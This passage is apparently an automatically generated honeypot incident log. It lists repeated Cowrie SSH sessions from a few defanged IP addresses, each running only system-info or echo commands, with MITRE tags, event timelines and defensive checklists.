| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:49 |
| **Last Seen** | 2026-06-25 19:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:49:35` | `cowrie.session.connect` |
| `2026-06-25 19:49:35` | `cowrie.client.version` |
| `2026-06-25 19:49:35` | `cowrie.client.kex` |
| `2026-06-25 19:49:35` | `cowrie.login.success` |
| `2026-06-25 19:49:36` | `cowrie.session.params` |
| `2026-06-25 19:49:36` | `cowrie.command.input` |
| `2026-06-25 19:49:36` | `cowrie.log.closed` |
| `2026-06-25 19:49:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6e7844f6c12

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:50 |
| **Last Seen** | 2026-06-25 19:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:50:38` | `cowrie.session.connect` |
| `2026-06-25 19:50:38` | `cowrie.client.version` |
| `2026-06-25 19:50:38` | `cowrie.client.kex` |
| `2026-06-25 19:50:39` | `cowrie.login.success` |
| `2026-06-25 19:50:39` | `cowrie.session.params` |
| `2026-06-25 19:50:39` | `cowrie.command.input` |
| `2026-06-25 19:50:40` | `cowrie.log.closed` |
| `2026-06-25 19:50:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b2143d2a696

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:51 |
| **Last Seen** | 2026-06-25 19:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:51:42` | `cowrie.session.connect` |
| `2026-06-25 19:51:42` | `cowrie.client.version` |
| `2026-06-25 19:51:42` | `cowrie.client.kex` |
| `2026-06-25 19:51:42` | `cowrie.login.success` |
| `2026-06-25 19:51:43` | `cowrie.session.params` |
| `2026-06-25 19:51:43` | `cowrie.command.input` |
| `2026-06-25 19:51:43` | `cowrie.log.closed` |
| `2026-06-25 19:51:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48b0288ff38d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 19:52 |
| **Last Seen** | 2026-06-25 19:52 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:52:44` | `cowrie.session.connect` |
| `2026-06-25 19:52:46` | `cowrie.client.version` |
| `2026-06-25 19:52:46` | `cowrie.client.kex` |
| `2026-06-25 19:52:53` | `cowrie.login.success` |
| `2026-06-25 19:52:57` | `cowrie.session.params` |
| `2026-06-25 19:52:57` | `cowrie.command.input` |
| `2026-06-25 19:52:59` | `cowrie.log.closed` |
| `2026-06-25 19:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee5f882becc4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:52 |
| **Last Seen** | 2026-06-25 19:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:52:45` | `cowrie.session.connect` |
| `2026-06-25 19:52:45` | `cowrie.client.version` |
| `2026-06-25 19:52:45` | `cowrie.client.kex` |
| `2026-06-25 19:52:45` | `cowrie.login.success` |
| `2026-06-25 19:52:46` | `cowrie.session.params` |
| `2026-06-25 19:52:46` | `cowrie.command.input` |
| `2026-06-25 19:52:46` | `cowrie.log.closed` |
| `2026-06-25 19:52:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b51ff5fe7a5f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:53 |
| **Last Seen** | 2026-06-25 19:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:53:47` | `cowrie.session.connect` |
| `2026-06-25 19:53:47` | `cowrie.client.version` |
| `2026-06-25 19:53:47` | `cowrie.client.kex` |
| `2026-06-25 19:53:47` | `cowrie.login.success` |
| `2026-06-25 19:53:48` | `cowrie.session.params` |
| `2026-06-25 19:53:48` | `cowrie.command.input` |
| `2026-06-25 19:53:48` | `cowrie.log.closed` |
| `2026-06-25 19:53:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bf7b26cdd10

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:54 |
| **Last Seen** | 2026-06-25 19:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:54:50` | `cowrie.session.connect` |
| `2026-06-25 19:54:50` | `cowrie.client.version` |
| `2026-06-25 19:54:50` | `cowrie.client.kex` |
| `2026-06-25 19:54:50` | `cowrie.login.success` |
| `2026-06-25 19:54:51` | `cowrie.session.params` |
| `2026-06-25 19:54:51` | `cowrie.command.input` |
| `2026-06-25 19:54:51` | `cowrie.log.closed` |
| `2026-06-25 19:54:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-567d79edfd88

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:55 |
| **Last Seen** | 2026-06-25 19:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:55:54` | `cowrie.session.connect` |
| `2026-06-25 19:55:54` | `cowrie.client.version` |
| `2026-06-25 19:55:54` | `cowrie.client.kex` |
| `2026-06-25 19:55:54` | `cowrie.login.success` |
| `2026-06-25 19:55:55` | `cowrie.session.params` |
| `2026-06-25 19:55:55` | `cowrie.command.input` |
| `2026-06-25 19:55:55` | `cowrie.log.closed` |
| `2026-06-25 19:55:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36f9f00a15e7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:57 |
| **Last Seen** | 2026-06-25 19:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:57:00` | `cowrie.session.connect` |
| `2026-06-25 19:57:00` | `cowrie.client.version` |
| `2026-06-25 19:57:00` | `cowrie.client.kex` |
| `2026-06-25 19:57:00` | `cowrie.login.success` |
| `2026-06-25 19:57:01` | `cowrie.session.params` |
| `2026-06-25 19:57:01` | `cowrie.command.input` |
| `2026-06-25 19:57:01` | `cowrie.log.closed` |
| `2026-06-25 19:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d1286f2ac3f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:58 |
| **Last Seen** | 2026-06-25 19:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:58:06` | `cowrie.session.connect` |
| `2026-06-25 19:58:06` | `cowrie.client.version` |
| `2026-06-25 19:58:06` | `cowrie.client.kex` |
| `2026-06-25 19:58:07` | `cowrie.login.success` |
| `2026-06-25 19:58:07` | `cowrie.session.params` |
| `2026-06-25 19:58:07` | `cowrie.command.input` |
| `2026-06-25 19:58:08` | `cowrie.log.closed` |
| `2026-06-25 19:58:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20e0bca13b35

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:59 |
| **Last Seen** | 2026-06-25 19:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:59:11` | `cowrie.session.connect` |
| `2026-06-25 19:59:11` | `cowrie.client.version` |
| `2026-06-25 19:59:12` | `cowrie.client.kex` |
| `2026-06-25 19:59:12` | `cowrie.login.success` |
| `2026-06-25 19:59:13` | `cowrie.session.params` |
| `2026-06-25 19:59:13` | `cowrie.command.input` |
| `2026-06-25 19:59:13` | `cowrie.log.closed` |
| `2026-06-25 19:59:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01c4d0478e90

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:00 |
| **Last Seen** | 2026-06-25 20:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:00:16` | `cowrie.session.connect` |
| `2026-06-25 20:00:16` | `cowrie.client.version` |
| `2026-06-25 20:00:16` | `cowrie.client.kex` |
| `2026-06-25 20:00:16` | `cowrie.login.success` |
| `2026-06-25 20:00:17` | `cowrie.session.params` |
| `2026-06-25 20:00:17` | `cowrie.command.input` |
| `2026-06-25 20:00:17` | `cowrie.log.closed` |
| `2026-06-25 20:00:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39b49a26878c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:00 |
| **Last Seen** | 2026-06-25 20:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:00:56` | `cowrie.session.connect` |
| `2026-06-25 20:00:56` | `cowrie.client.version` |
| `2026-06-25 20:00:56` | `cowrie.client.kex` |
| `2026-06-25 20:00:56` | `cowrie.login.success` |
| `2026-06-25 20:00:57` | `cowrie.session.params` |
| `2026-06-25 20:00:57` | `cowrie.command.input` |
| `2026-06-25 20:00:57` | `cowrie.log.closed` |
| `2026-06-25 20:00:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11dea205bf79

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:01 |
| **Last Seen** | 2026-06-25 20:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:01:37` | `cowrie.session.connect` |
| `2026-06-25 20:01:37` | `cowrie.client.version` |
| `2026-06-25 20:01:37` | `cowrie.client.kex` |
| `2026-06-25 20:01:37` | `cowrie.login.success` |
| `2026-06-25 20:01:38` | `cowrie.session.params` |
| `2026-06-25 20:01:38` | `cowrie.command.input` |
| `2026-06-25 20:01:38` | `cowrie.log.closed` |
| `2026-06-25 20:01:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e682ce09750d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:02 |
| **Last Seen** | 2026-06-25 20:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:02:18` | `cowrie.session.connect` |
| `2026-06-25 20:02:18` | `cowrie.client.version` |
| `2026-06-25 20:02:18` | `cowrie.client.kex` |
| `2026-06-25 20:02:18` | `cowrie.login.success` |
| `2026-06-25 20:02:19` | `cowrie.session.params` |
| `2026-06-25 20:02:19` | `cowrie.command.input` |
| `2026-06-25 20:02:19` | `cowrie.log.closed` |
| `2026-06-25 20:02:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0902ee37f86d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:03 |
| **Last Seen** | 2026-06-25 20:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:03:00` | `cowrie.session.connect` |
| `2026-06-25 20:03:00` | `cowrie.client.version` |
| `2026-06-25 20:03:00` | `cowrie.client.kex` |
| `2026-06-25 20:03:01` | `cowrie.login.success` |
| `2026-06-25 20:03:01` | `cowrie.session.params` |
| `2026-06-25 20:03:01` | `cowrie.command.input` |
| `2026-06-25 20:03:02` | `cowrie.log.closed` |
| `2026-06-25 20:03:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c00786e31f60

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 20:03 |
| **Last Seen** | 2026-06-25 20:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:03:37` | `cowrie.session.connect` |
| `2026-06-25 20:03:37` | `cowrie.client.version` |
| `2026-06-25 20:03:37` | `cowrie.client.kex` |
| `2026-06-25 20:03:39` | `cowrie.login.success` |
| `2026-06-25 20:03:40` | `cowrie.session.params` |
| `2026-06-25 20:03:40` | `cowrie.command.input` |
| `2026-06-25 20:03:41` | `cowrie.log.closed` |
| `2026-06-25 20:03:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17c948b1430c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:03 |
| **Last Seen** | 2026-06-25 20:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:03:43` | `cowrie.session.connect` |
| `2026-06-25 20:03:43` | `cowrie.client.version` |
| `2026-06-25 20:03:43` | `cowrie.client.kex` |
| `2026-06-25 20:03:43` | `cowrie.login.success` |
| `2026-06-25 20:03:44` | `cowrie.session.params` |
| `2026-06-25 20:03:44` | `cowrie.command.input` |
| `2026-06-25 20:03:44` | `cowrie.log.closed` |
| `2026-06-25 20:03:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a4cc1290e4f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:04 |
| **Last Seen** | 2026-06-25 20:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:04:26` | `cowrie.session.connect` |
| `2026-06-25 20:04:26` | `cowrie.client.version` |
| `2026-06-25 20:04:26` | `cowrie.client.kex` |
| `2026-06-25 20:04:26` | `cowrie.login.success` |
| `2026-06-25 20:04:27` | `cowrie.session.params` |
| `2026-06-25 20:04:27` | `cowrie.command.input` |
| `2026-06-25 20:04:27` | `cowrie.log.closed` |
| `2026-06-25 20:04:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-218b51600ebb

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 20:04 |
| **Last Seen** | 2026-06-25 20:05 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:04:48` | `cowrie.session.connect` |
| `2026-06-25 20:04:49` | `cowrie.client.version` |
| `2026-06-25 20:04:49` | `cowrie.client.kex` |
| `2026-06-25 20:04:55` | `cowrie.login.success` |
| `2026-06-25 20:04:59` | `cowrie.session.params` |
| `2026-06-25 20:04:59` | `cowrie.command.input` |
| `2026-06-25 20:05:01` | `cowrie.log.closed` |
| `2026-06-25 20:05:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19e38cc4daf9

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:05 |
| **Last Seen** | 2026-06-25 20:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:05:08` | `cowrie.session.connect` |
| `2026-06-25 20:05:08` | `cowrie.client.version` |
| `2026-06-25 20:05:08` | `cowrie.client.kex` |
| `2026-06-25 20:05:09` | `cowrie.login.success` |
| `2026-06-25 20:05:10` | `cowrie.session.params` |
| `2026-06-25 20:05:10` | `cowrie.command.input` |
| `2026-06-25 20:05:10` | `cowrie.log.closed` |
| `2026-06-25 20:05:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51c13eaeb923

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:05 |
| **Last Seen** | 2026-06-25 20:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:05:50` | `cowrie.session.connect` |
| `2026-06-25 20:05:50` | `cowrie.client.version` |
| `2026-06-25 20:05:50` | `cowrie.client.kex` |
| `2026-06-25 20:05:50` | `cowrie.login.success` |
| `2026-06-25 20:05:51` | `cowrie.session.params` |
| `2026-06-25 20:05:51` | `cowrie.command.input` |
| `2026-06-25 20:05:51` | `cowrie.log.closed` |
| `2026-06-25 20:05:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c35131cfa8e4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:06 |
| **Last Seen** | 2026-06-25 20:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:06:31` | `cowrie.session.connect` |
| `2026-06-25 20:06:31` | `cowrie.client.version` |
| `2026-06-25 20:06:31` | `cowrie.client.kex` |
| `2026-06-25 20:06:31` | `cowrie.login.success` |
| `2026-06-25 20:06:32` | `cowrie.session.params` |
| `2026-06-25 20:06:32` | `cowrie.command.input` |
| `2026-06-25 20:06:32` | `cowrie.log.closed` |
| `2026-06-25 20:06:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e97c27238048

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:07 |
| **Last Seen** | 2026-06-25 20:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:07:12` | `cowrie.session.connect` |
| `2026-06-25 20:07:12` | `cowrie.client.version` |
| `2026-06-25 20:07:12` | `cowrie.client.kex` |
| `2026-06-25 20:07:12` | `cowrie.login.success` |
| `2026-06-25 20:07:13` | `cowrie.session.params` |
| `2026-06-25 20:07:13` | `cowrie.command.input` |
| `2026-06-25 20:07:13` | `cowrie.log.closed` |
| `2026-06-25 20:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8592bbfa3a9e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:07 |
| **Last Seen** | 2026-06-25 20:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:07:53` | `cowrie.session.connect` |
| `2026-06-25 20:07:53` | `cowrie.client.version` |
| `2026-06-25 20:07:53` | `cowrie.client.kex` |
| `2026-06-25 20:07:54` | `cowrie.login.success` |
| `2026-06-25 20:07:54` | `cowrie.session.params` |
| `2026-06-25 20:07:54` | `cowrie.command.input` |
| `2026-06-25 20:07:54` | `cowrie.log.closed` |
| `2026-06-25 20:07:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1857c7b18b4e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:08 |
| **Last Seen** | 2026-06-25 20:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:08:35` | `cowrie.session.connect` |
| `2026-06-25 20:08:35` | `cowrie.client.version` |
| `2026-06-25 20:08:35` | `cowrie.client.kex` |
| `2026-06-25 20:08:36` | `cowrie.login.success` |
| `2026-06-25 20:08:37` | `cowrie.session.params` |
| `2026-06-25 20:08:37` | `cowrie.command.input` |
| `2026-06-25 20:08:37` | `cowrie.log.closed` |
